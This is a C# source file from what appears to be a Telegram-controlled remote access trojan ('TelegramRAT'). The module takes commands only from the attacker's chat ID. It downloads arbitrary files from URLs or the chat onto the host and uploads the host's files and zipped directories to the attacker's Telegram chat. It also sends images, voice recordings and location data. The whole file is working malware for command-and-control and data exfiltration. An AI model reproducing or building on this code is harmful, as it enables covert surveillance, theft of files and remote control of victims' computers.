using System;
using System.IO;
using System.Net;
using System.Threading;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types.InputFiles;

namespace TelegramRAT
{
    internal class telegram
    {
        // Settings
        private static string apiToken = config.TelegramToken;
        private static string chatID = config.TelegramChatID;


        // Bot
        private static TelegramBotClient bot = new TelegramBotClient(apiToken);

        // Wait commands
        public static void waitCommands()
        {
            bot.OnMessage += onNewMessage;
            bot.StartReceiving();
        }

        // Get commands
        private static void onNewMessage(object sender, MessageEventArgs e)
        {
            // If not the creator of the bot writes
            if (e.Message.Chat.Id.ToString() != chatID)
            {
                bot.SendTextMessageAsync(chatId: e.Message.Chat.Id, text: "👑 You not my owner!");
                return;
            }
            // Run command
            if (e.Message.Type.ToString().Equals("Text")) {
                // If not command
                if (!e.Message.Text.StartsWith("/"))
                { return; }
                // Handle received command in new thread
                Thread t = new Thread(() => commands.handle(e.Message.Text));
                t.SetApartmentState(ApartmentState.STA);
                t.Start();
            // Download file from computer to chat
            } else if (e.Message.Type.ToString().Equals("Document"))
            {
                var fileInfo = e.Message.Document;
                var file = bot.GetFileAsync(fileInfo.FileId);
                DownloadFile(fileInfo.FileName, file.Result.FilePath);
            // Unknown type
            } else
            {
                sendText("🍩 Unknown type received. Only Text/Document can be used!");
            }
            
        }


        // Send text
        public static void sendText(string text)
        {
            bot.SendTextMessageAsync(chatID, text);
        }

        // Send image
        public static void sendImage(string file)
        {
            // If is file
            if (!File.Exists(file))
            {
                sendText("⛔ File not found!");
                return;
            }
            FileStream stream = new FileStream(file, FileMode.Open);
            bot.SendPhotoAsync(chatID, stream);
        }

        // Send voice
        public static void sendVoice(string file, int time)
        {
            FileStream stream = File.OpenRead(file);
            bot.SendVoiceAsync(
                chatId: chatID,
                voice: stream,
                duration: time
            );
        }

        // Send location
        public static void sendLocation(float lat, float lon)
        {
            bot.SendLocationAsync(chatID, lat, lon);
        }
        // Send file from chat/url to computer
        public static void DownloadFile(string file, string path = "")
        {
            WebClient client = new WebClient();
            // Download file from url
            if(file.StartsWith("http"))
            {
                sendText(String.Format("📄 Downloading file \"{0}\" from url", Path.GetFileName(file)));
                try
                {
                    client.DownloadFile(new Uri(file), Path.GetFileName(file));
                } catch
                {
                    sendText(String.Format("💥 Connection error"));
                    return;
                }
                
                sendText(String.Format("💾 File \"{0}\" saved in: \"{1}\"", file, Path.GetFullPath(Path.GetFileName(file))));
            // Download file from chat
            } else
            {
                sendText(String.Format("📄 Downloading file: \"{0}\"", file));
                path = @"https://api.telegram.org/file/bot" + apiToken + "/" + path;
                client.DownloadFile(new Uri(path), file);
                sendText(String.Format("💾 File \"{0}\" saved in: \"{1}\"", file, Path.GetFullPath(file)));
            }   
        }

        // Send file from computer to chat
        public static void UploadFile(string file, bool removeAfterUpload = false)
        {
            // If is file
            if(File.Exists(file))
            {
                sendText("📃 Uploading file...");
                // Send file
                FileStream fs = File.OpenRead(file);
                InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, file);
                bot.SendDocumentAsync(chatID, inputOnlineFile);
                // Remove after uploading
                if(removeAfterUpload)
                {
                    while (true)
                    {
                        try { File.Delete(file); }
                        catch (IOException)
                        { continue; }
                        break;
                    }
                }
            }
            // If is directory
            else if(Directory.Exists(file))
            {
                sendText("📁 Uploading directory...");
                string zfile = file + ".zip";
                if(File.Exists(zfile))
                { File.Delete(zfile); }
                // Add dir to archive
                System.IO.Compression.ZipFile.CreateFromDirectory(file, zfile);
                // Send archive
                FileStream fs = File.OpenRead(zfile);
                InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, zfile);
                bot.SendDocumentAsync(chatID, inputOnlineFile);
                // Delete archive (костыль)
                while(true)
                {
                    try { File.Delete(zfile); }
                    catch (IOException)
                    { continue; }
                    break;
                }
            // If path not exists
            }
            else
            {
                sendText("⛔ File not found!");
                return;
            }   
        }
        
        // Send connected
        public static void sendConnection()
        {
            sendText("🍀 Bot online");
        }
        
    }
}
